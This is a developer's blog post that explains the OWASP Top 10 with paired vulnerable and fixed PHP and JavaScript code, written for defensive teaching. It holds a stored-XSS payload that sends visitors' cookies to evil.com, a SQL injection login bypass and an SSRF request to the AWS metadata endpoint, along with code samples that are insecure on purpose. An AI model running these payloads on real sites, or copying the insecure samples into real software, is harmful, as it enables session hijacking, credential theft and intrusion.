OWASP Top 10 — What Every Developer Should Know

✍️ Idra Mkumbanya · 📅 June 2025 · 📖 ~12 min read

The OWASP Top 10 is the most widely recognised list of critical web application security risks, maintained by the Open Web Application Security Project. If you build anything for the web — even a simple contact form — understanding these vulnerabilities is not optional. This is my practical breakdown of all ten, with real examples written in PHP and JavaScript, and concrete fixes you can apply today.

What is OWASP?

The Open Web Application Security Project (OWASP) is a non-profit foundation that works to improve software security. Their Top 10 list — updated every few years — represents a broad consensus about the most critical security risks facing web applications. The current version is OWASP Top 10:2021.

Every entry on this list has caused real data breaches at real companies. Learning them as a developer means you stop accidentally building vulnerabilities into your code from the start.

💡
How to read this post
For each vulnerability I show what the attack looks like, then how to prevent it. The code examples use PHP because that's what I build with, but the concepts apply to every language and framework.

A01 — Broken Access Control

Access control enforces that users can only do what they are allowed to do. When it breaks, users can access other people's data, admin pages, or perform actions they shouldn't.

Real example: A URL like /user?id=42 shows a user's profile. If you change it to /user?id=43 and see someone else's data — that's broken access control. It's the #1 vulnerability for a reason.

PHP — Vulnerable
// BAD: trusts the user-supplied ID directly
$id = $_GET['id'];
$user = $db->query("SELECT * FROM users WHERE id = $id");
PHP — Fixed
// GOOD: verify the logged-in user owns this resource
session_start();
$requested_id = (int) $_GET['id'];

if ($requested_id !== $_SESSION['user_id']) {
    http_response_code(403);
    die('Access denied.');
}

$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$requested_id]);

A02 — Cryptographic Failures

Previously called "Sensitive Data Exposure," this covers situations where data is not properly protected — either stored or in transit. The most common mistake: storing passwords in plain text or using weak hashing like MD5.

PHP — Vulnerable
// BAD: MD5 is broken — rainbow tables crack these in seconds
$password_hash = md5($_POST['password']);
$db->query("INSERT INTO users (password) VALUES ('$password_hash')");
PHP — Fixed
// GOOD: bcrypt via password_hash() — slow by design, salted automatically
$hash = password_hash($_POST['password'], PASSWORD_BCRYPT);
$stmt = $db->prepare("INSERT INTO users (password) VALUES (?)");
$stmt->execute([$hash]);

// Verifying on login:
if (password_verify($_POST['password'], $stored_hash)) {
    // login success
}
⚠️
Always use HTTPS. Even perfect password storage is useless if the password is sent over plain HTTP and intercepted on the network. Get a free SSL certificate from Let's Encrypt.

A03 — Injection

Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. SQL injection is the most famous example — an attacker inserts SQL code into a form field that gets executed by your database.

Imagine a login form. A user enters ' OR '1'='1 as their password. A vulnerable query becomes:

SQL — What the attacker causes
SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'
-- '1'='1' is always true — logs in as admin with no password
PHP — Vulnerable
// BAD: user input directly in SQL string
$username = $_POST['username'];
$password = $_POST['password'];
$result = $db->query(
    "SELECT * FROM users WHERE username='$username' AND password='$password'"
);
PHP — Fixed (Prepared Statements)
// GOOD: parameterised query — user input never touches the SQL structure
$stmt = $db->prepare(
    "SELECT * FROM users WHERE username = ? AND password = ?"
);
$stmt->execute([$_POST['username'], $_POST['password']]);
$user = $stmt->fetch();

Rule: Never concatenate user input into a SQL query. Always use prepared statements. Always. No exceptions.

A04 — Insecure Design

This one is about architecture, not code. It means security was never considered during the design phase — not that something was implemented badly, but that the design itself has no defence against certain attacks.

Example: A password reset feature that emails a reset link but doesn't expire it. An attacker who gains temporary access to someone's email can use old reset links indefinitely.

Fix: Make reset tokens expire (15–30 minutes), single-use, and tied to the user's current email address. Security needs to be designed in, not bolted on.

A05 — Security Misconfiguration

The most common vulnerability overall. This includes: default passwords left unchanged, directory listing enabled, verbose error messages showing file paths, unnecessary features left on, and missing HTTP security headers.

PHP — Vulnerable (verbose errors in production)
// BAD: shows attacker your file structure and database details
ini_set('display_errors', 1);
error_reporting(E_ALL);
PHP — Fixed
// GOOD: log errors privately, show nothing to users
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', '/var/log/php_errors.log');
error_reporting(E_ALL);
.htaccess — Security headers
# Prevent MIME sniffing
Header set X-Content-Type-Options "nosniff"

# Block clickjacking
Header set X-Frame-Options "DENY"

# Disable directory listing
Options -Indexes

# Hide server version
ServerTokens Prod

A06 — Vulnerable and Outdated Components

Using libraries, frameworks, or server software with known vulnerabilities. The classic example: a WordPress site running plugins from 2019 with publicly documented exploits that any attacker can look up on CVE databases.

How to prevent it:

  • Regularly update dependencies — composer update for PHP, npm audit fix for Node.js
  • Subscribe to security advisories for libraries you use
  • Remove unused dependencies — every library is an attack surface
  • Check your stack at snyk.io or deps.dev

A07 — Identification and Authentication Failures

Weaknesses in how your application verifies who someone is. Common problems: allowing unlimited login attempts (brute force), not invalidating sessions on logout, weak session token generation.

PHP — Rate limiting login attempts
session_start();

// Track failed attempts in session
if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
    $_SESSION['last_attempt']   = time();
}

// Reset counter after 15 minutes
if (time() - $_SESSION['last_attempt'] > 900) {
    $_SESSION['login_attempts'] = 0;
}

// Block after 5 failures
if ($_SESSION['login_attempts'] >= 5) {
    die('Too many attempts. Please wait 15 minutes.');
}

// On failed login:
$_SESSION['login_attempts']++;
$_SESSION['last_attempt'] = time();

A08 — Software and Data Integrity Failures

This covers situations where code or data is used without verifying its integrity. The most common developer encounter: loading JavaScript from a CDN without Subresource Integrity (SRI) checks. If the CDN is compromised, your users run malicious code.

HTML — Vulnerable (no integrity check)
<!-- BAD: if cdnjs.com is hacked, attackers control this script -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
HTML — Fixed (SRI hash)
<!-- GOOD: browser verifies the file matches this exact hash -->
<script
    src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
    integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ=="
    crossorigin="anonymous"></script>

Generate SRI hashes at srihash.org.

A09 — Security Logging and Monitoring Failures

If you're not logging security events, you won't know when you're being attacked — or that you were attacked three months ago and all your user data was stolen.

What to log:

  • Failed login attempts (with timestamp and IP)
  • Successful logins from new locations
  • Password changes and account updates
  • Access to sensitive data or admin functions
  • Input validation failures (someone probing for SQL injection)
PHP — Basic security logging
function logSecurityEvent(string $event, string $detail = ''): void {
    $ip        = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $timestamp = date('Y-m-d H:i:s');
    $user      = $_SESSION['user_id'] ?? 'guest';
    $line      = "[$timestamp] $event | user=$user | ip=$ip | $detail\n";

    file_put_contents('/var/log/security.log', $line, FILE_APPEND | LOCK_EX);
}

// Usage:
logSecurityEvent('LOGIN_FAILED', "username={$_POST['username']}");
logSecurityEvent('ADMIN_ACCESS', 'page=users/delete');

A10 — Server-Side Request Forgery (SSRF)

SSRF occurs when your web application fetches a remote resource based on user-supplied input, and an attacker uses this to make your server send requests to internal systems that should never be publicly accessible.

Example: Your app has a feature that fetches a preview of a URL the user provides. An attacker submits http://169.254.169.254/latest/meta-data/ — a special AWS metadata endpoint — and your server happily fetches cloud credentials for them.

PHP — Vulnerable
// BAD: fetches any URL the user provides
$url = $_GET['url'];
$content = file_get_contents($url); // could be an internal IP!
PHP — Fixed
// GOOD: allowlist only specific external domains
function isSafeUrl(string $url): bool {
    $allowed = ['example.com', 'api.example.org'];
    $host    = parse_url($url, PHP_URL_HOST);

    // Block private/internal IP ranges
    $ip = gethostbyname($host);
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return false;
    }
    return in_array($host, $allowed, true);
}

$url = $_GET['url'];
if (!isSafeUrl($url)) {
    die('URL not allowed.');
}
$content = file_get_contents($url);

Bonus: Cross-Site Scripting (XSS)

XSS didn't make the 2021 Top 10 as a standalone entry (it falls under A03 Injection) but it's still everywhere and worth calling out. XSS happens when an attacker injects JavaScript into a page that other users then view and execute.

Stored XSS example: A comment field that stores and displays user input without sanitising it. An attacker posts <script>document.location='https://evil.com?c='+document.cookie</script> — every visitor to that page sends their session cookie to the attacker.

PHP — Vulnerable
// BAD: renders raw user input as HTML
echo $comment['text'];
PHP — Fixed
// GOOD: escapes HTML entities — script tags become harmless text
echo htmlspecialchars($comment['text'], ENT_QUOTES, 'UTF-8');
JavaScript — Also vulnerable
// BAD: injects raw HTML
element.innerHTML = userInput;

// GOOD: sets text content only — no HTML parsing
element.textContent = userInput;

Quick Reference Summary

Risk One-line fix
A01 Broken Access Control Check server-side: does this user own this resource?
A02 Cryptographic Failures Use password_hash(), enforce HTTPS
A03 Injection Always use prepared statements, never concatenate input into queries
A04 Insecure Design Think about abuse cases before writing code
A05 Security Misconfiguration Disable directory listing, hide errors, add security headers
A06 Outdated Components Run composer update and npm audit regularly
A07 Auth Failures Rate-limit logins, expire sessions properly
A08 Integrity Failures Add SRI hashes to all CDN scripts
A09 Logging Failures Log all auth events with timestamp and IP
A10 SSRF Allowlist external URLs, block internal IP ranges
XSS (bonus) Use htmlspecialchars(), use textContent not innerHTML

Where to Practice

Reading about vulnerabilities is good. Exploiting them in a safe environment is much better. These platforms let you practice legally:

  • DVWA (Damn Vulnerable Web Application) — run locally with Docker, covers all OWASP categories
  • TryHackMe — has a dedicated OWASP Top 10 room, guided with hints
  • PortSwigger Web Security Academy — free, world-class labs from the makers of Burp Suite
  • HackTheBox — harder, more realistic web challenges
🎯
My recommendation if you're starting out:
Go through the TryHackMe OWASP Top 10 room first — it's free and takes about 3 hours. Then set up DVWA locally and try to exploit each vulnerability yourself before reading the solution. That hands-on repetition is what makes it stick.

Final Thought

The OWASP Top 10 isn't a checklist you tick once and forget. It's a way of thinking — learning to look at your own code and ask "how could someone abuse this?" As a developer who also studies security, this mindset is what separates code that works from code that's safe.

I'm applying these principles to everything I build — including this portfolio. If you spot something I missed or want to discuss any of these vulnerabilities in more depth, reach out.
